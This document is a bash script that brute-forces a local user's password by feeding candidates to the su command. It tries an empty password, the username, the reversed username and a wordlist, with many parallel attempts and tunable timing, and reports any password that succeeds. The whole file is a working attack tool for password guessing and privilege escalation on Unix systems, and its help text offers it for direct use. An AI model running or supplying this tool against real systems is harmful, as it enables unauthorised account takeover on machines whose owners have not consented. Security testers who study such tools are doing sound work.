#!/bin/bash

help="This tool bruteforces a selected user using binary su and as passwords: null password, username, reverse username and a wordlist (top12000.txt).
You can specify a username using -u <username> and a wordlist via -w <wordlist>.
By default the BF default speed is using 100 su processes at the same time (each su try last 0.7s and a new su try in 0.007s) ~ 143s to complete
You can configure this times using -t (timeout su process) ans -s (sleep between 2 su processes).
Fastest recommendation: -t 0.5 (minimun acceptable) and -s 0.003 ~ 108s to complete

Example:    ./suBF.sh -u <USERNAME> [-w top12000.txt] [-t 0.7] [-s 0.007]

THE USERNAME IS CASE SENSITIVE AND THIS SCRIPT DOES NOT CHECK IF THE PROVIDED USERNAME EXIST, BE CAREFUL\n\n"

WORDLIST="top12000.txt"
USER=""
TIMEOUTPROC="0.7"
SLEEPPROC="0.007"
while getopts "h?u:t:s:w:" opt; do
  case "$opt" in
    h|\?) printf "$help"; exit 0;;
    u)  USER=$OPTARG;;
    t)  TIMEOUTPROC=$OPTARG;;
    s)  SLEEPPROC=$OPTARG;;
    w)  WORDLIST=$OPTARG;;
    esac
done

if ! [ "$USER" ]; then printf "$help"; exit 0; fi

if ! [[ -p /dev/stdin ]] && ! [ $WORDLIST = "-" ] && ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 0; fi

C=$(printf '\033')

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout $TIMEOUTPROC su $USER -c whoami 2>/dev/null` 
  if [ "$trysu" ]; then
    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    exit 0;
  fi
}

su_brute_user_num (){
  echo "  [+] Bruteforcing $1..."
  USER=$1
  su_try_pwd $USER "" &    #Try without password
  su_try_pwd $USER $USER & #Try username as password
  su_try_pwd $USER `echo $USER | rev 2>/dev/null` &     #Try reverse username as password

  if ! [[ -p /dev/stdin ]] && [ -f "$WORDLIST" ]; then
    while IFS='' read -r P || [ -n "${P}" ]; do # Loop through wordlist file   
      su_try_pwd $USER $P & #Try TOP TRIES of passwords (by default 2000)
      sleep $SLEEPPROC # To not overload the system
    done < $WORDLIST

  else
    cat - | while read line; do
      su_try_pwd $USER $line & #Try TOP TRIES of passwords (by default 2000)    
      sleep $SLEEPPROC # To not overload the system
    done
  fi
  wait
}

su_brute_user_num $USER
echo "  Wordlist exhausted" | sed "s,.*,${C}[1;31;107m&${C}[0m,"
